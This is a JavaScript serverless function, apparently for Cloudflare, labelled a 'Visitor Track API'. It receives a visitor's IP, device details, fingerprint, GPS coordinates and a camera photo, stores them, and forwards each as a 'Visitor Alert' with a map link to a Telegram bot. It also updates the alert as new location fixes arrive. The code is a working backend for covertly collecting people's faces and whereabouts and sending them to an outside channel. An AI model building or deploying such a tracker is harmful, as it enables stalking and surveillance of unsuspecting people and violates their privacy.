// ============================================================
// VISITOR TRACK API
// ============================================================

export async function onRequestGet() {
  return new Response(
    JSON.stringify({
      ok: true,
      route: "track.js",
      message: "Cloudflare track function is deployed"
    }),
    {
      status: 200,
      headers: {
        "Content-Type": "application/json",
        "Cache-Control": "no-store"
      }
    }
  );
}

const MAX_BODY_SIZE = 1100000;
const MAX_IMAGE_LENGTH = 900000;


// ============================================================
// MAIN POST
// ============================================================

export async function onRequestPost({ request, env }) {

  let body = {};

  try {

    // ========================================================
    // REQUEST SIZE CHECK
    // ========================================================

    const contentLength = Number(
      request.headers.get("Content-Length") || 0
    );

    if (contentLength > MAX_BODY_SIZE) {

      return json(
        {
          ok: false,
          error: "Request too large"
        },
        413
      );
    }

    // ========================================================
    // READ BODY
    // ========================================================

    const raw = await request.text();

    if (raw.length > MAX_BODY_SIZE) {

      return json(
        {
          ok: false,
          error: "Request too large"
        },
        413
      );
    }

    body = JSON.parse(raw);

    // ========================================================
    // VALIDATE SESSION
    // ========================================================

    const id = String(body.session_id || "");

    if (!isValidId(id)) {

      return json(
        {
          ok: false,
          error: "Invalid session_id"
        },
        400
      );
    }

    const event = String(body.event || "unknown");

    // ========================================================
    // IP
    // ========================================================

    const ip =
      request.headers.get("CF-Connecting-IP") ||
      "unknown";

    // ========================================================
    // EXISTING SESSION
    // ========================================================

    const key = `visitor:${id}`;

    let session = await env.VISITOR_KV.get(key);

    session = session
      ? JSON.parse(session)
      : {
          session_id: id,
          created: new Date().toISOString()
        };

    // ========================================================
    // BASIC DATA
    // ========================================================

    const safeBody = sanitizeBody(body);

    Object.assign(
      session,
      safeBody,
      {
        session_id: id,
        ip,
        updated: new Date().toISOString()
      }
    );

    // ========================================================
    // IMAGE
    // ========================================================

    if (
      typeof body.image === "string" &&
      body.image.startsWith("data:image/")
    ) {

      if (body.image.length > MAX_IMAGE_LENGTH) {

        session.camera = "image_too_large";

      } else {

        try {

          // --------------------------------------------------
          // Prefer R2
          // --------------------------------------------------

          if (env.VISITOR_R2) {

            const imageKey =
              `visitor/${id}.jpg`;

            const imageData =
              dataUrlToUint8Array(body.image);

            await env.VISITOR_R2.put(
              imageKey,
              imageData,
              {
                httpMetadata: {
                  contentType: "image/jpeg",
                  cacheControl:
                    "private, max-age=300"
                }
              }
            );

            session.image_key = imageKey;

            session.image_storage = "r2";

            // Never store the Base64 image in KV
            delete session.image;

          } else {

            // ------------------------------------------------
            // Backward-compatible KV fallback
            // ------------------------------------------------

            session.image = body.image;

            session.image_storage = "kv";

          }

        } catch (imageError) {

          console.log(
            "Image storage failed:",
            imageError
          );

          session.camera =
            session.camera ||
            "image_storage_failed";
        }
      }
    }

    // ========================================================
    // SAVE SESSION
    // ========================================================

    await env.VISITOR_KV.put(
      key,
      JSON.stringify(session),
      {
        expirationTtl: 60 * 60 * 24 * 30
      }
    );

    // ========================================================
    // FINAL EVENT
    // ========================================================

    if (event === "final") {

      await processFinalEvent(
        env,
        id,
        session
      );
    }

    // ========================================================
    // GPS EVENT
    // ========================================================

    if (
      event === "gps" &&
      validCoordinate(session.lat) &&
      validCoordinate(session.lng)
    ) {

      await processGpsEvent(
        env,
        id,
        session
      );
    }

    return json({
      ok: true
    });

  } catch (error) {

    console.log(
      "Track error:",
      error
    );

    // Don't send the full raw request to Telegram.
    // It could contain a large image.

    try {

      await sendTelegramError(
        env,
        error?.message || "Unknown error"
      );

    } catch (telegramError) {

      console.log(
        "Error notification failed:",
        telegramError
      );
    }

    return json(
      {
        ok: false,
        error: "Tracking request failed"
      },
      500
    );
  }
}


// ============================================================
// FINAL EVENT
// ============================================================

async function processFinalEvent(
  env,
  id,
  session
) {

  const telegramKey =
    `telegram:${id}`;

  const lockKey =
    `telegram_lock:${id}`;

  // ----------------------------------------------------------
  // Already sent?
  // ----------------------------------------------------------

  const existing =
    await env.VISITOR_KV.get(
      telegramKey
    );

  if (existing) {
    return;
  }

  // ----------------------------------------------------------
  // Short duplicate protection
  // ----------------------------------------------------------

  const lock =
    await env.VISITOR_KV.get(
      lockKey
    );

  if (lock) {
    return;
  }

  await env.VISITOR_KV.put(
    lockKey,
    "1",
    {
      expirationTtl: 30
    }
  );

  try {

    const telegram =
      await sendTelegram(
        env,
        session
      );

    await env.VISITOR_KV.put(
      telegramKey,
      JSON.stringify(telegram),
      {
        expirationTtl: 60 * 60 * 24
      }
    );

  } finally {

    await env.VISITOR_KV.delete(
      lockKey
    );
  }
}


// ============================================================
// GPS UPDATE
// ============================================================

async function processGpsEvent(
  env,
  id,
  session
) {

  const telegramKey =
    `telegram:${id}`;

  const stored =
    await env.VISITOR_KV.get(
      telegramKey
    );

  if (!stored) {
    return;
  }

  try {

    const telegram =
      JSON.parse(stored);

    if (
      !telegram.message_id
    ) {
      return;
    }

    await editTelegram(
      env,
      telegram.message_id,
      telegram.message_type,
      session
    );

  } catch (error) {

    console.log(
      "GPS Telegram update failed:",
      error
    );
  }
}


// ============================================================
// TELEGRAM SEND
// ============================================================

async function sendTelegram(
  env,
  session
) {

  if (!env.BOT_TOKEN) {
    throw new Error(
      "BOT_TOKEN is not configured"
    );
  }

  if (!env.CHAT_ID) {
    throw new Error(
      "CHAT_ID is not configured"
    );
  }

  const map =
    validCoordinate(session.lat) &&
    validCoordinate(session.lng)
      ? `https://maps.google.com/?q=${session.lat},${session.lng}`
      : null;

  const text =
    buildText(
      session,
      map
    );

  // ==========================================================
  // PHOTO
  // ==========================================================

  if (
    typeof session.image === "string" &&
    session.image.startsWith("data:image/")
  ) {

    const imageData =
      dataUrlToUint8Array(
        session.image
      );

    const blob =
      new Blob(
        [imageData],
        {
          type: "image/jpeg"
        }
      );

    const form =
      new FormData();

    form.append(
      "chat_id",
      String(env.CHAT_ID)
    );

    form.append(
      "photo",
      blob,
      "visitor.jpg"
    );

    form.append(
      "caption",
      text
    );

    form.append(
      "parse_mode",
      "HTML"
    );

    const response =
      await fetch(
        `https://api.telegram.org/bot${env.BOT_TOKEN}/sendPhoto`,
        {
          method: "POST",
          body: form
        }
      );

    const result =
      await response.json();

    if (!result.ok) {

      throw new Error(
        JSON.stringify(result)
      );
    }

    return {
      message_id:
        result.result.message_id,

      message_type:
        "photo"
    };
  }

  // ==========================================================
  // TEXT
  // ==========================================================

  const response =
    await fetch(
      `https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        body:
          new URLSearchParams({
            chat_id:
              String(env.CHAT_ID),

            text,

            parse_mode:
              "HTML",

            disable_web_page_preview:
              "false"
          })
      }
    );

  const result =
    await response.json();

  if (!result.ok) {

    throw new Error(
      JSON.stringify(result)
    );
  }

  return {
    message_id:
      result.result.message_id,

    message_type:
      "text"
  };
}


// ============================================================
// TELEGRAM EDIT
// ============================================================

async function editTelegram(
  env,
  messageId,
  messageType,
  session
) {

  const map =
    `https://maps.google.com/?q=${session.lat},${session.lng}`;

  const text =
    buildText(
      session,
      map
    );

  let endpoint;

  let params;

  if (messageType === "photo") {

    endpoint =
      "editMessageCaption";

    params = {
      chat_id:
        String(env.CHAT_ID),

      message_id:
        String(messageId),

      caption:
        text,

      parse_mode:
        "HTML"
    };

  } else {

    endpoint =
      "editMessageText";

    params = {
      chat_id:
        String(env.CHAT_ID),

      message_id:
        String(messageId),

      text,

      parse_mode:
        "HTML",

      disable_web_page_preview:
        "false"
    };
  }

  const response =
    await fetch(
      `https://api.telegram.org/bot${env.BOT_TOKEN}/${endpoint}`,
      {
        method: "POST",
        body:
          new URLSearchParams(params)
      }
    );

  const result =
    await response.json();

  if (!result.ok) {

    console.log(
      "Telegram edit failed:",
      result
    );
  }
}


// ============================================================
// ERROR MESSAGE
// ============================================================

async function sendTelegramError(
  env,
  error
) {

  if (!env.BOT_TOKEN || !env.CHAT_ID) {
    return;
  }

  const safe =
    escapeHTML(
      String(error).slice(0, 1500)
    );

  await fetch(
    `https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`,
    {
      method: "POST",
      body:
        new URLSearchParams({
          chat_id:
            String(env.CHAT_ID),

          text:
            `❌ <b>Visitor Tracker Error</b>\n\n${safe}`,

          parse_mode:
            "HTML"
        })
    }
  );
}


// ============================================================
// TEXT BUILDER
// ============================================================

function buildText(
  s,
  map
) {

  const device =
    escapeHTML(
      shortDevice(
        s.device
      )
    );

  const os =
    escapeHTML(
      s.os || "-"
    );

  const browser =
    escapeHTML(
      getBrowser(
        s.device
      )
    );

  const ip =
    escapeHTML(
      s.ip || "-"
    );

  const network =
    escapeHTML(
      s.network || "-"
    );

  const lat =
    escapeHTML(
      s.lat ?? "Fetching..."
    );

  const lng =
    escapeHTML(
      s.lng ?? "Fetching..."
    );

  const error =
    s.error
      ? `\n❌ <b>Error:</b> ${escapeHTML(s.error)}`
      : "";

  const mapLine =
    map
      ? `🔗 <a href="${escapeHTML(map)}">Open Map</a>`
      : "🔗 Location unavailable";

  return `
🚨 <b>Visitor Alert</b>

🕒 <b>Time:</b> ${formatTime(s.updated)}

🌐 <b>IP:</b> ${ip}

📱 <b>Device:</b> ${device}
💻 <b>OS:</b> ${os}
🌍 <b>Browser:</b> ${browser}

📡 <b>Network:</b> ${network}

📍 <b>Location:</b>
Lat: ${lat}
Lng: ${lng}

${mapLine}

${error}
`;
}


// ============================================================
// BODY SANITIZATION
// ============================================================

function sanitizeBody(
  body
) {

  const allowed = [
    "user_id",
    "fingerprint",
    "event",
    "device",
    "os",
    "browser",
    "network",
    "downlink",
    "lat",
    "lng",
    "camera",
    "time",
    "error"
  ];

  const result = {};

  for (const field of allowed) {

    if (
      body[field] !== undefined &&
      body[field] !== null
    ) {

      const value =
        typeof body[field] === "string"
          ? body[field].slice(0, 2000)
          : body[field];

      result[field] =
        value;
    }
  }

  return result;
}


// ============================================================
// ID VALIDATION
// ============================================================

function isValidId(
  id
) {

  return /^[a-zA-Z0-9_-]{20,100}$/.test(id);
}


// ============================================================
// COORDINATE VALIDATION
// ============================================================

function validCoordinate(
  value
) {

  const n =
    Number(value);

  return (
    Number.isFinite(n) &&
    n >= -180 &&
    n <= 180
  );
}


// ============================================================
// DATA URL → BYTES
// ============================================================

function dataUrlToUint8Array(
  dataUrl
) {

  const comma =
    dataUrl.indexOf(",");

  if (comma === -1) {
    throw new Error(
      "Invalid image data"
    );
  }

  const base64 =
    dataUrl.slice(
      comma + 1
    );

  const binary =
    atob(base64);

  const bytes =
    new Uint8Array(
      binary.length
    );

  for (
    let i = 0;
    i < binary.length;
    i++
  ) {
    bytes[i] =
      binary.charCodeAt(i);
  }

  return bytes;
}


// ============================================================
// HTML ESCAPE
// ============================================================

function escapeHTML(
  value = ""
) {

  return String(value)
    .replace(
      /&/g,
      "&amp;"
    )
    .replace(
      /</g,
      "&lt;"
    )
    .replace(
      />/g,
      "&gt;"
    )
    .replace(
      /"/g,
      "&quot;"
    )
    .replace(
      /'/g,
      "&#039;"
    );
}


// ============================================================
// TIME
// ============================================================

function formatTime(
  value
) {

  try {

    return new Date(
      value
    ).toLocaleString(
      "en-IN",
      {
        timeZone:
          "Asia/Kolkata"
      }
    );

  } catch {

    return "-";
  }
}


// ============================================================
// DEVICE
// ============================================================

function shortDevice(
  ua = ""
) {

  ua =
    String(ua);

  if (
    /iPhone/i.test(ua)
  ) {
    return "iPhone";
  }

  if (
    /iPad/i.test(ua)
  ) {
    return "iPad";
  }

  if (
    /Android/i.test(ua)
  ) {
    return "Android Mobile";
  }

  if (
    /Windows/i.test(ua)
  ) {
    return "Windows PC";
  }

  if (
    /Macintosh/i.test(ua)
  ) {
    return "Mac";
  }

  if (
    /Linux/i.test(ua)
  ) {
    return "Linux";
  }

  return "Unknown Device";
}


// ============================================================
// BROWSER
// ============================================================

function getBrowser(
  ua = ""
) {

  ua =
    String(ua);

  if (
    /Edg\//i.test(ua)
  ) {
    return "Microsoft Edge";
  }

  if (
    /OPR\//i.test(ua)
  ) {
    return "Opera";
  }

  if (
    /CriOS\//i.test(ua)
  ) {
    return "Chrome iOS";
  }

  if (
    /FxiOS\//i.test(ua)
  ) {
    return "Firefox iOS";
  }

  if (
    /Chrome\//i.test(ua)
  ) {
    return "Chrome";
  }

  if (
    /Firefox\//i.test(ua)
  ) {
    return "Firefox";
  }

  if (
    /Safari\//i.test(ua)
  ) {
    return "Safari";
  }

  return "Unknown";
}


// ============================================================
// JSON RESPONSE
// ============================================================

function json(
  data,
  status = 200
) {

  return new Response(
    JSON.stringify(data),
    {
      status,
      headers: {
        "Content-Type":
          "application/json",

        "Cache-Control":
          "no-store"
      }
    }
  );
}
